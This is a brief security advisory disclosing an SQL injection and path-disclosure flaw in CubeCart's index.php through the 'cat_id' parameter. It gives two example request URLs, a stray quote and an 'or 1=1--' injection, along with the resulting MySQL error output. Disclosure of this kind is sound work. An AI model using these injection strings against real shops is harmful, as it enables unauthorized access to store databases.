[1]Introduction

"CubeCart is an eCommerce script written with PHP & MySQL. With CubeCart you can setup a powerful online store as long as you 

have hosting supporting PHP and one MySQL database."

This info was taken from http://www.cubecart.com

CubeCart, from Brooky (http://www.brooky.com), is a software formerly known as eStore.


[2]The Problem

A remote user can cause an error in index.php using the parameter 'cat_id' which is not properly validated, displaying the 

software's full installation path. It can also be used to inject sql commands. Examples follow:

(a)	http://example.com/store/index.php?cat_id='

	causes an error like this:
		
	"Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in 				

	/home/example/public_html/store/link_navi.php on line 35

	Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in 					

	/home/example/public_html/store/index.php on line 170

	Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in 				

	/home/example/public_html/store/index.php on line 172"


(b)	http://example.com/store/index.php?cat_id=1 or 1=1--

	displays all categories in the database


[3]The Solution

None at this time. Vendor contacted and fix will be avaliable soon.
